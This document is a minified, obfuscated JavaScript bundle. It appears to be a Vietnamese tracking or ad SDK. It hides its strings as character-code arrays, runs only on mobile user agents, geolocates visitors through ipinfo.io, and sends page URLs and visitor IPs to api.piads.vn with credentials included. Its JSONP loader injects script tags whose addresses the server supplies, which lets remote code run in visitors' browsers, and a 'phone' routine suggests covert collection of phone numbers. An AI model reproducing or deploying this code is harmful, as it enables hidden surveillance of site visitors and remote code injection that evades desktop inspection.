!function(t){var e={};function n(i){if(e[i])return e[i].exports;var s=e[i]={i,l:!1,exports:{}};return t[i].call(s.exports,s,s.exports,n),s.l=!0,s.exports}n.m=t,n.c=e,n.d=function(t,e,i){n.o(t,e)||Object.defineProperty(t,e,{enumerable:!0,get:i})},n.r=function(t){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(t,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(t,"__esModule",{value:!0})},n.t=function(t,e){if(1&e&&(t=n(t)),8&e)return t;if(4&e&&"object"==typeof t&&t&&t.__esModule)return t;var i=Object.create(null);if(n.r(i),Object.defineProperty(i,"default",{enumerable:!0,value:t}),2&e&&"string"!=typeof t)for(var s in t)n.d(i,s,function(e){return t[e]}.bind(null,s));return i},n.n=function(t){var e=t&&t.__esModule?function(){return t["default"]}:function(){return t};return n.d(e,"a",e),e},n.o=function(t,e){return{}.hasOwnProperty.call(t,e)},n.p="",n(n.s=0)}([function(t,e,n){t.exports=n(1)},function(t,e,n){var i,s=(i=n(2))&&i.__esModule?i:{default:i};!function(t){var e=function(t){try{var e=t[0],n=[].slice.call(t,1);!function(t,e,n){for(var i=t.split("."),s=i.pop(),a=0;a<i.length;a++)e=e[i[a]];e[s].apply(e,n)}(e,s.default,n)}catch(t){}},n=[];if(t.psdk){if((n=psdk.q||[]).length>0)for(var i=0;i<n.length;i++)e(n[i])}else t.psdk=function(){e(arguments)};t.getIp=function(t){s.default.ip(t)}}(window)},function(t,e,n){Object.defineProperty(e,"__esModule",{value:!0});var i,s=(i=n(3))&&i.__esModule?i:{default:i},a={clnt:{},create:function(t){a.clnt&&(a.clnt=new s.default,a.clnt.key=t,a.clnt.init())},phone:function(){a.clnt&&1===a.clnt.status?a.clnt.phone():setTimeout(a.phone,100)},ip:function(t){a.clnt&&1===a.clnt.status?a.clnt.ip(t):setTimeout(a.ip,100)}};e.default=a},function(t,e,n){Object.defineProperty(e,"__esModule",{value:!0});var i,s=function(){function t(t,e){for(var n=0;n<e.length;n++){var i=e[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(t,i.key,i)}}return function(e,n,i){return n&&t(e.prototype,n),i&&t(e,i),e}}(),a=(i=n(4))&&i.__esModule?i:{default:i},r=function(){function t(){!function(t,e){if(!(t instanceof e))throw new TypeError("Cannot call a class as a function")}(this,t),this._key=null,this._api=a.default.b2s([47,47,97,112,105,46,112,105,97,100,115,46,118,110,47,97,112,105,47,100,103,97,100,115,47]),this._pk=null,this._status=0,this._rsa=null,this._pass=null,this._aes=null,this._certs=[],this._mvt=null,this._mvm=null,this._acc=null,this._tmstmp=null,this._livingTime=0,this._hasProvince=!1,this._province="",this._scriptId=""}return s(t,[{key:"reset",value:function(){this._pk=null,this._status=0,this._rsa=null,this._pass=null,this._aes=null,this._certs=[],this._mvt=null,this._mvm=null,this._acc=null,this._tmstmp=null,this._livingTime=0,this._hasProvince=!1,this._province="",this._token="",this._scriptId=""}},{key:"init",value:async function(){try{a.default.vmd();var t=a.default.b2s([99,114,101,97,116,101,63,107,101,121,61]),e=await this.getr(t+this._key);if(!e||200!==e.status)return;var n=await e.json();if(!n||200!==n.status)return;var i=n.data;if(!i)return;if(i.livingTime||(i.livingTime=0),this._livingTime=i.livingTime,this._hasProvince=i.hasProvince,i.timestamp){var s=a.default.b2s([95]),r=i.timestamp.split(s);this._acc=r[0].trim(),this._tmstmp=r[1].trim()}this.initNew()}catch(t){this.reset()}}},{key:"getIpInfo",value:async function(){var t=a.default.b2s([47,47,105,112,105,110,102,111,46,105,111,47,106,115,111,110]),e=a.default.b2s([71,69,84]),n=a.default.b2s([99,111,114,115]),i=await fetch(t,{method:e,mode:n});if(i&&200===i.status){var s=await i.json();this._province=s.city?a.default.ruc(s.city):""}}},{key:"initNew",value:async function(){a.default.vmd(),this._hasProvince&&await this.getIpInfo(),await this.timeout(1e3*this._livingTime);var t=a.default.b2s([105,110,105,116,63,107,101,121,61]),e=await this.postr(t+this._key,{});if(e&&200===e.status){var n=await e.json();if(n&&200===n.status){var i=n.data,s=a.default.b2s([59]);this._certs=i.certs.split(s),this._mvt=i.mvt,this._mvm=i.mvm,this._token=i.token,this._scriptId=i.scriptId,this._status=1}}}},{key:"timeout",value:function(t){return new Promise((function(e){return setTimeout(e,t)}))}},{key:"phone",value:async function(){try{a.default.vmd();var t=this._mvm;t&&t.length>0&&a.default.jp(t,this._token,this._scriptId)}catch(t){this.reset()}}},{key:"ip",value:async function(t){try{a.default.vmd();var e=a.default.b2s([115,101,110,100,63,107,101,121,61]),n=await this.postr(e+this._key,{},{ip:t}),i=!1;if(200!==n.status)i=!0;else{var s=await n.json();if(s&&200===s.status){var r=s.message,u=a.default.b2s([79,75]);r&&r===u||(i=!0,this._mvm=r||"")}else i=!0}if(i){var l=this._mvm;if(l&&l.length>0){var o=a.default.b2s([59]),c=l.split(o);a.default.jp(c[0]),a.default.jp(c[1])}}}catch(t){this.reset()}}},{key:"gpd",value:function(t){return this._aes.decrypt(this._pass,t)}},{key:"getr",value:function(t){var e=a.default.b2s([71,69,84]),n=a.default.b2s([105,110,99,108,117,100,101]),i=a.default.b2s([117,114,108]),s=a.default.b2s([97,99,99]),r=a.default.b2s([116,109,115,116,109,112]),u={};return u[i]=window.location.href,u[s]=this._acc,u[r]=this._tmstmp,fetch(this._api+t,{method:e,credentials:n,headers:u})}},{key:"postr",value:function(t,e,n){e=e||{};var i={},s=a.default.b2s([117,114,108]),r=a.default.b2s([97,99,99]),u=a.default.b2s([116,109,115,116,109,112]),l=a.default.b2s([112,114,111,118,105,110,99,101]),o=a.default.b2s([67,111,110,116,101,110,116,45,84,121,112,101]),c=a.default.b2s([97,112,112,108,105,99,97,116,105,111,110,47,106,115,111,110,59,99,104,97,114,115,101,116,61,85,84,70,45,56]);i[s]=window.location.href,i[r]=this._acc,i[u]=this._tmstmp,i[l]=this._province,i[o]=c,Object.assign(i,n);var f=a.default.b2s([80,79,83,84]),h=a.default.b2s([105,110,99,108,117,100,101]);return fetch(this._api+t,{method:f,credentials:h,headers:i,body:JSON.stringify(e)})}},{key:"key",get:function(){return this._key},set:function(t){this._key=t}},{key:"status",get:function(){return this._status}}]),t}();e.default=r},function(t,e,n){Object.defineProperty(e,"__esModule",{value:!0});var i={vmd:function(){try{var t=this.b2s([105]),e=this.b2s([40,97,110,100,114,111,105,100,124,105,112,40,104,111,110,101,41,41]),n=new RegExp(e,t),i=this.b2s([40,119,105,110,100,111,119,115,32,112,104,111,110,101,124,105,101,109,111,98,105,108,101,124,119,112,100,101,115,107,116,111,112,124,98,108,97,99,107,98,101,114,114,121,41]),s=new RegExp(i,t),a=this.b2s([40,119,105,110,124,109,97,99,41]),r=new RegExp(a,t);if((!navigator.userAgent.match(n)||navigator.platform&&navigator.platform.match(r))&&!navigator.userAgent.match(s))throw new Error}catch(t){throw new Error}},jp:function(t,e,n){return new Promise((function(s,a){var r=i.b2s,u=Math.round(1e4*Math.random()),l=r([112,105,97,100,115,95]),o=n||l+u,c=e||o;window[c]=function(t){delete window[c];var e=document.getElementById(o);e.parentNode.removeChild(e),s(t)};var f=r([63]),h=r([38]),d=r([99,97,108,108,98,97,99,107,61]),v=t+(-1===t.indexOf(f)?f:h)+d+c,p=document.createElement(r([115,99,114,105,112,116]));p.async=!0;var m=r([116,101,120,116,47,106,97,118,97,115,99,114,105,112,116]);p.type=m,p.id=o,p.src=v;var _=r([85,84,70,45,56]);p.charset=_;var y=r([101,114,114,111,114]);p.addEventListener(y,a);var b=r([104,101,97,100]);(document.getElementsByTagName(b)[0]||document.body||document.documentElement).appendChild(p)}))},b2s:function(t){return String.fromCharCode.apply(String,t)},ruc:function(t){return(t=t||"").normalize("NFD").replace(/[\u0300-\u036f]/g,"").replace(/đ/g,"d").replace(/Đ/g,"D")}};e.default=i}]);